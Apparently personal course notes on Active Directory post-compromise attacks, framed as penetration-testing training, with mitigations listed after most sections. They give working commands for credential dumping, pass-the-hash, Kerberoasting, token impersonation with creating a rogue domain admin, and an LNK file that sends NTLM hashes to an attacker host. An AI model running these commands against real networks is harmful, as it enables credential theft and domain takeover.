
#### Quick Information:

- Flow performed till now with the AD attack and Post compromise Attack:
	- Using LLMNR we found a user hash -> user hash -> cracked it using hash cat -> sprayed the password -> found new login -> secretsdump those logins -> local admin hashes -> respray the network with local accounts.
	
- ##### Post Compromise Attack Strategy:
	- We have an account, now what?
		- Search the quick wins
			- Kerberoasting
			- Secretsdump
			- Pass the hash / pass the password
		- No quick wins? Dig deep!
			- Enumerate (Bloodhound, etc.)
			- Where does your account have access? (Shared paths and etc.)
			- Old vulnerabilities die hard
		- Think outside the box

#### Pass Attacks:

##### Pass the Password:
- In this attack, we are going to use the password we are aware of an exploited account and use it in the crackmapexec to see, where else this username/password can be used and if the user is a local admin in that machine or not
- Syntax:
	- `crackmapexec smb {ip-address/CIDR} -u {user} -d {domain} -p {password}`
##### Pass the Hash:
- In this attack type, we are going to use hashes instead of password, if we are unaware of the user's password. Hashes can be grabbed with below steps:
	- We can run Metasploit with Hasdump module, to get some local hashes of other accounts
	- Along with that, we can also use secretsdump.py to get some local hashes 
	- `secretsdump.py MARVEL.local/fcastle:Password!@10.0.0.25`
	- We can also use secretsdump with an hash instead of an password:
		- `secretsdump.py administrator:@10.0.0.25 -hashes {NTLM hash}`
- Once, we have the SAM hashes for the accounts, we can use the crackmapexec application to check the same, if that user has access  in any other systems
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {SAM hash} --local-auth`
- Also, if we want crackmapexec to dump all the SAM hashes, where ever the successful login is done, this dump the SAM hashes of the machines, which we were able to login
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --sam`
- We can also enumerate shares using the below:
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --shares`
- We also have built in modules in crackmapexec, using below will provide the same:
	- `crackmapexec smb -L`
	- `crackmapexec smb {ip-address/CIDR} -u {username}-H {hash} --local-auth -M lsassy`
		- lsassy is a built in module of crackmapexec, which can be used to dump credentials of other users, if they are logged in to the machine
- We can also use lsa to dump the passwords of users that are logged in and the stored passwords, which can be cracked.
	- `crackmapexec smb {ip-address/CIDR} -u {username} -H {hash} --local-auth --lsa`
- Last, but not the least, we can see all the passwords and other details, we obtained using the crackmapexec in the cmedb, this can be accessed using 
	- `cmedb`
	- if we need help - `cmedb` and then type `help`
	- `hosts` to see all the hosts we cracked and `creds` to show all the passwords that has been successfully cracked.

#### Pass Attack Mitigations:

- Hard to completely prevent, but we can make it more difficult on an attacker:
	- Limit account re-use:
		- Avoid re-using local admin password.
		- Disable Guest and Administrator accounts
		- Limit who is a local administrator (least privilege)
	- Utilize strong passwords:
		- The longer the better (> 14 character)
		- Avoid using common words
	- Privilege Access Management (PAM):
		- Check out/in sensitive accounts when needed
		- Automatically rotate passwords on check out and check in
		- Limits pass attacks as hash/password i strong and constantly rotated

#### Kerberoasting:

- Kerberoasting is an attack technique that targets Kerberos authentication in Windows environments. Attackers request service tickets for service accounts, capture these tickets, and then attempt to crack them offline to retrieve the account passwords. This is effective against service accounts, which often have weak passwords and elevated privileges, potentially allowing attackers access to sensitive resources.

- Flow:
	- User requests TGT (Ticket Granting Ticket), provide NTLM Hash -> Domain Controller -> Domain controller responds back with the TGT with krbtgt hash -> User -> User requests TGS (Ticket Granting Service) for Server and provides the TGT -> Domain Controller -> DC then shares the TGS with server's account hash (which can be used to crack service accounts creds) -> Present this TGS to server with server's account -> Application Server

- Goal of the kerberoasting is to get the TGS and decrypt server's account hash
- Tools used for kerberoasting is `Get SPNs`, `Dump Hash`
	- Syntax: `sudo GetUserSPNs.py {domain}/{username:'password'} -dc-ip {dc_ip_address} -request`
	- Example: `sudo GetUserSPNs.py MARVEL.local/fcastle:'Password1' -dc-ip 10.0.0.1 -request`
- Once we have the TGS with the hash, we can crack the hash using hash cat.
	- `Hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

#### Kerberoasting mitigation:

- Service accounts should not be running as domain admins and make sure we have strong passwords 
- Service accounts should always hold least privilege in the machine


#### Token Impersonation:

- What are tokens:
	- Temporary keys that allow you access to system/network without having to provide credentials each time you access a file. Think cookies for computers.
- **Two types:**
	- **Delegate** - Created for logging into a machine or using Remote Desktop
	- **Impersonate** -  "non-interactive" such as attaching a network drive or a domain logon script
- Steps for token impersonation:
	- First start metasploit with `msfconsole` and search for psexec `search psExec` for exploiting the vulnerable and fetch the shell from the machine
	- Find the module `exploit/windows/smb/psexec` and use the module with `use {module-name}/{number}`
	- Set the required parameters in the module  in `options`
	- Set the RHOSTS, SMBDomain, SMBPass, SMBUser to the vulnerable machine with network discovery turned on.
	- Once everything is set, type `run` or `exploit`, Once the exploit is completed, meterpreter will be opened, and type `load incognito`.
	- Once incognito module is loaded, we will have access to a variety of options, which we can find with `help` command.
	- Use the incognito commands in the help section to add list tokens that are currently available.
	- Once a administrator or someone from domain admin group logs into the machine, we can see the tokens in incognito using `list_tokens -u` for users and `list_tokens -g` for groups 
	- If we have the required user token, we can impersonate the person using the command `impersonate_token {domain}\\{username}` 
		- {`\\`} - double slash is for escaping the character
	- Once successfully completed, we can use the `shell` command to grab the shell of the impersonated user/domain admin.
	- Using the impersonated account, we will create a new user to maintain the domain admin access incase the impersonated account is logged off.
	- Using the command `net user /add {new_user_name} {Password} /domain` - this will add a new user to the domain in the domain controller.
	- Using the command `net group "Domain Admins {new_user_name} /ADD /DOMAIN` - this will add the newly created user to the domain admins group, will can be later used to access the domain controller and do other stuff, as we have access now to the domain controller with domain admin creds.
		- We can use this user to dump the SAM hashes using the secrets dump tool as well.
			- `secretsdump.py domain.local/{new_user_name}:{'Password'}@{DC_IP_Address}`
			- This dumps all the local SAM hashes as well as the domain user hashes.


#### Token Impersonation Mitigation:

- Limit user/group token creation permission
- Account tiering
- Local admin restriction


#### LNK File Attacks:

-  LNK file attacks are useful for grabbing the hashes of users, if we have a shared file path. LNK file is just a file, which can be placed in the shared file and if we have a responder setup in the attacker machine listening for the NTLM hashes, as if anyone visits the folder that the LNK file is present, NTLM hashes are immediately sent to the attacker machine and the responder catches the hashes, the target doesn't even need to click on the file.

- Steps:
	1) Create a LNK file in any windows machine using below code in administrator privileged power shell
		1) `$objShell = New-Object -ComObject WScript.shell`
		2) `$lnk = $objShell.CreateShortcut("C:\test.lnk")`
		3) `$lnk.TargetPath = "\\192.168.138.149\@test.png"`
		4) `$lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"`
		5) `$lnk.Description = "Test"`
		6) `$lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()`
	2) Once the code executed, file will be saved in the C drive, grab the file and share it to the shared path in the exploited target machine.
	3) In the attacker machine, start the responder: `sudo responder -I eth0 -dPv`
	4) Once any user accesses the shared path and goes to the folder that has the LNK file, that's it we have the NTLM hashes of the user immediately in the responder, without even user opening the file
	5) Using these hashes, we can crack the password and use that creds.
	
- We can also perform a automated attack similar to LNK file using CME/NetExec, this tool does the work of creating a link and running a responder in the attacker machine and listen for hashes.
	- `netexec smb {Expoited_target_ip_address} -d {domain}.local -u {username} -p {password} -M slinky -o NAME={filename} SERVER={Attacker_IP_Address}`

- Additional resources for forced authentication with different attacks similar to LNK file:
	- [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf)


#### GPP /  cPassword Attacks and Mitigations:

- Overview:
	- Group Policy Preferences (GPP) allowed admins to create policies using embedded credentials
	- These credentials were encrypted and placed in a "cPassword"
	- The key was accidentally released
	- Patched in MS14-025, but it doesn't prevent previous uses
	- Still relevant on pentests
- Once we have the "cPassword" from the GPP.xml file, we can decrypt it easily using the builtin gpp-decrypt in kali as: `gpp-decrypt {encrypted_cPassword}`
- We can also use metasploit to check the GPP.xml files and decrypt the cPassword if it finds any, we just need a hacked /  exploited user creds in the domain
	- We can use `smb_enum_gpp` module in metasploit

- ##### Mitigations:

	-  PATCH! Fixed in KB2962486
	- Delete the old GPP xml files stored in SYSVOL


#### Mimikatz ( #Tools):

- Overview:
	- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
	- Dump credentials stored in memory
	- Just a few attacks: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Silver Ticket and Golden ticket



## Post-Domain Compromise Attack Strategy:

-  We have the domain and the next steps to proceed:
	- Provide as much value to the client as possible
		- Put your blinders on and do it again
		- Dump the NTDS.dit and crack passwords
		- Enumerate shares for sensitive information
	- Persistence can be important
		- What happens if our DA access is lost?
			- Creating a DA account can be useful (Do not forget to delete it)
			- Creating a Golden Ticket can be useful, too

- What is NTDS.dit?:
	- A database used to store AD data, this data includes:
		- User information
		- Group information
		- Security descriptors
		- And oh yeah, password hashes
	- We can use secretsdump to dump the NTDS.dit database with below command:
		- `secretsdump.py {domain}.local/{username}:{'password'}@{DC-IPAddress} -just-dc-ntlm`

-  What is Golden Ticket Attacks:
	- When we compromise the krbtgt account, we own the domain
	- We can request access to any resource or system on the domain
	- Golden tickets == Complete access to every machine
	- We can utilize mimikatz to obtain the information necessary to perform this attack

#### Additional AD Attacks:

- Active Directory vulnerabilities occur all the time.
	- Recent major vulnerabilities include:
		- Zerologon
		- PrintNightmare
		- Sam the Admin
	- It's worth checking for these vulnerabilities, but you should not attempt to exploit them unless your client approves

- Zerologon details:
	- What is ZeroLogon? - [https://www.trendmicro.com/en_us/what-is/zerologon.html](https://www.trendmicro.com/en_us/what-is/zerologon.html)
	- dirkjanm CVE-2020-1472 - [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
	- SecuraBV ZeroLogon Checker - [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

- PrintNightmare:
	- cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
	- calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)



### AD Case Study #1:

[https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security/](https://tcm-sec.com/pentest-tales-001-you-spent-how-much-on-security)
### AD Case Study #2:

[https://tcm-sec.com/pentest-tales-002-digging-deep](https://tcm-sec.com/pentest-tales-002-digging-deep)


